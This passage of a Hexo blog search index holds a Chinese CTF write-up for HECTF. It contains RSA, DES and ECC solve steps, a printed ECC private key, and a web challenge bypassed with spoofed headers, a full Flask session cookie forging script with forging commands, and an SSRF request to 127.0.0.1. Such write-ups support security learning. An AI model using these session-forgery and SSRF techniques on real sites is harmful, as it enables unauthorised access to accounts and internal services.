class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n= <span class="number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line">c= <span class="number">7650350848303138131393086727727533413756296838218347123997040508192472569084746342253915001354023303648603939313635106855058934664365503492172</span></span><br><span class="line"><span class="comment"># P = [2217990919</span></span><br><span class="line"><span class="comment"># ,4278428893</span></span><br><span class="line"><span class="comment"># , 2804303069</span></span><br><span class="line"><span class="comment"># , 3654864131</span></span><br><span class="line"><span class="comment"># , 2923072267</span></span><br><span class="line"><span class="comment"># , 2338725373</span></span><br><span class="line"><span class="comment"># , 2706073949</span></span><br><span class="line"><span class="comment"># , 2970591037</span></span><br><span class="line"><span class="comment"># , 2370292207</span></span><br><span class="line"><span class="comment"># , 2463878387</span></span><br><span class="line"><span class="comment"># , 3939901243</span></span><br><span class="line"><span class="comment"># , 2794985117</span></span><br><span class="line"><span class="comment"># , 3207148519</span></span><br><span class="line"><span class="comment"># , 4093178561</span></span><br><span class="line"><span class="comment"># , 3831680819]</span></span><br><span class="line">P = [<span class="number">2217990919</span></span><br><span class="line">,<span class="number">4278428893</span></span><br><span class="line">,<span class="number">2794985117</span></span><br><span class="line">,<span class="number">3831680819</span></span><br><span class="line">,<span class="number">2804303069</span></span><br><span class="line">,<span class="number">2923072267</span></span><br><span class="line">,<span class="number">3939901243</span></span><br><span class="line">,<span class="number">2463878387</span></span><br><span class="line">,<span class="number">2970591037</span></span><br><span class="line">,<span class="number">2706073949</span></span><br><span class="line">,<span class="number">3654864131</span></span><br><span class="line">,<span class="number">2370292207</span></span><br><span class="line">,<span class="number">2338725373</span></span><br><span class="line">,<span class="number">4093178561</span></span><br><span class="line">,<span class="number">3207148519</span>]</span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P)):</span><br><span class="line">    phi *= P[i]-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="comment"># m = 10657149102724042824057034258679160487094630140056870412930577982121073769242507083776</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>进入第三关：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gIHkeIlRQp1fLeSWEqZJdOTO4aRYRB2OGRcBycHQ1OAdi6UEULYbwIvYh+0alYScSEoN4TOejgTjdPsetrURRlLX6dcifjX6VvLxY7TnMk7c8/xy17mybq/yNQf0vFGh8byC88bUeHian9dA2Qh6rRBYS1I7iNxM62RtCFZ+1OKeaqGIDjf3/VuPlbnCePYIY5FVs6xNXjkGh0m57t2QW4CoGI5lz6OcAAwg4AHP0d8CfeldOF/TogPwOiPaRlDbtHXCh54Bs5ZivV+jDerr0RQvCGYBFHYLJnvyrFtyZC9BxAQ8gQnGlWNDjE1V6BByUvJjpI9DcUyRSNN21rUWouOiLwtKX0BgDQkGH9PhtzhmGYI+R3lZJ4x30l+Xqweu</span><br><span class="line"></span><br><span class="line">DES CBC PKCS7 key：hectf iv：<span class="number">0000</span></span><br></pre></td></tr></table></figure><p>找到一个<a href="https://the-x.cn/cryptography/Des.aspx">在线网址</a> 很多是无法操作的 但是这个可以</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119103228110.png" alt="image-20231119103228110"></p><p>成功获得flag：<code>HECTF&#123;DES_RSA_AES_WOMENSA_ZHENQIANG&#125;</code></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119162730981.png" alt="image-20231119162730981"></p><h3 id="esayecc">esayecc</h3><h4 id="考点：ecc椭圆曲线加密">考点：ECC椭圆曲线加密</h4><h4 id="解题：">解题：</h4><p>首先给了一个私钥文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgotFz7q/WASYctvjN</span><br><span class="line">Cm4zE7fkywF7jJV0nIME7bsW2i6hRANCAARClk9phO799cZ7E/ZF3ByjzczSz2Wd</span><br><span class="line">fuVuLvrNSK0wlUCXegI/pVSDhvLM9diYBj0hear1pO4tA89Kttmsl4Bf</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>利用在线网址进行解密 获得公钥文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQpZPaYTu/fXGexP2Rdwco83M0s9l</span><br><span class="line">nX7lbi76zUitMJVAl3oCP6VUg4byzPXYmAY9IXmq9aTuLQPPSrbZrJeAXw==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>利用<a href="https://www.ssleye.com/ssltool/pub_asysi.html">在线工具</a> 对公钥文件进行解密:</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119101454309.png" alt="image-20231119101454309"></p><p>原题代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> ECC</span><br><span class="line"><span class="keyword">from</span> fastecdsa <span class="keyword">import</span> curve</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">me = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">key = ECC.generate(curve=<span class="string">&#x27;NIST P-256&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;pem.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(key.export_key(<span class="built_in">format</span>=<span class="string">&#x27;PEM&#x27;</span>))</span><br><span class="line">G = key.public_key()</span><br><span class="line">k = key.d</span><br><span class="line">n = G.order()</span><br><span class="line">p = curve.P256.p</span><br><span class="line">r = randprime(<span class="number">1</span>, n-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">M = E.random_point()</span><br><span class="line"><span class="comment"># M = (mx, my)</span></span><br><span class="line">e = nextprime(my-mx)</span><br><span class="line">N = n * p</span><br><span class="line">c = <span class="built_in">pow</span>(me, e, <span class="built_in">int</span>(N))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">K = k*G</span><br><span class="line">c1 = M+r*K</span><br><span class="line">c2 = r*G</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 340411986008332622492252515156919590702658555525072399052451683041772652474839788525448087771416400264570261404595656046016551644464496921197111421138765</span></span><br><span class="line"><span class="comment"># c1 = (71430232672331113271988412132459391678542075997754159037222774180961171917977 : 62238630405406252154015032808640586594811636815028129383858020738965206372881 : 1)</span></span><br><span class="line"><span class="comment"># c2 = (25742109236464952840117078659367834030129507446418393682693133323915430074859 : 65657711071079869088595294059522027768683424454908946840021611773238453793364 : 1)</span></span><br></pre></td></tr></table></figure><h2 id="web">web</h2><h3 id="伪装者">伪装者</h3><p>首先本地访问：</p><p><code>X-Forwarded-For: 127.0.0.1</code></p><p>然后Referer：</p><p><code>Referer: ctf.sc0de.com</code></p><p>最后使用的浏览器：</p><p><code>User-Agent: Firefox</code></p><p>然后进入username的检测</p><p>我们发现在输入框中 单纯输入<code>zxk1ing</code> 是无法成功进入的</p><p>注意到存在session</p><p>把session利用下面脚本进行解密  <a href="https://m.freebuf.com/articles/web/331823.html">脚本来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(metaclass=ABCMeta):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=<span class="string">&#x27;Flask Session Cookie Decoder/Encoder&#x27;</span>,</span><br><span class="line">                epilog=<span class="string">&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(<span class="built_in">help</span>=<span class="string">&#x27;sub-command help&#x27;</span>, dest=<span class="string">&#x27;subcommand&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">&#x27;encode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;encode&#x27;</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--cookie-structure&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Session cookie structure&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">&#x27;decode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;decode&#x27;</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--cookie-value&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Session cookie value&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">&#x27;encode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">&#x27;decode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure><p>首先对原始session进行解密：</p><p>在终端输入命令行启动 -s后面接的是密钥 我们推测是这个名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python session.py decode -s <span class="string">&quot;zxk1ing&quot;</span> -c <span class="string">&quot;eyJrZXkiOiJ6eGsxaW5nIiwidXNlcm5hbWUiOiJqb2tlciJ9.ZVmUuQ.FGqtCpSwv-lmNqDzTIFxpoS66Ck&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;zxk1ing&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;joker&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到存在关键词username</p><p>把username改成<code>zxk1ing</code></p><p>然后加密 生成伪造的session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python session.py encode -s <span class="string">&quot;zxk1ing&quot;</span> -t <span class="string">&quot;&#123;&#x27;key&#x27;: &#x27;zxk1ing&#x27;, &#x27;username&#x27;: &#x27;zxk1ing&#x27;&#125;&quot;</span>                   </span><br><span class="line">eyJrZXkiOiJ6eGsxaW5nIiwidXNlcm5hbWUiOiJ6eGsxaW5nIn0.ZVmW3A.Vp7Tyn1njNuyFxSO4TPpoqC__qk</span><br></pre></td></tr></table></figure><p>替换原来session后成功进入</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119131909449.png" alt="image-20231119131909449"></p><p>然后访问<code>/P1aceuWillneverkn0w</code> 进入之后只有一张图片</p><p>意料之外</p><p>既然里面加了引号 肯定是有节目的</p><p>查看一下这个图片的地址</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119215745106.png" alt="image-20231119215745106"></p><p>考虑到==ssrf==</p><p>把他复制然后访问</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119215813666.png" alt="image-20231119215813666"></p><p>前面会自动拼接题目的网址 后面跟图片的URL</p><p>然后根据本地的特性提醒</p><p>我们去访问<code>127.0.0.1/P1aceuWillneverkn0w</code></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231119215920527.png" alt="image-20231119215920527"></p><p>成功获得flag ： <code>HECTF&#123;04800e5c552a70de9ef7a9cd00a26c90c107e010&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf-contest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-contest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/21/hello-world/"/>
      <url>/2023/11/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start">Quick Start</h2><h3 id="create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
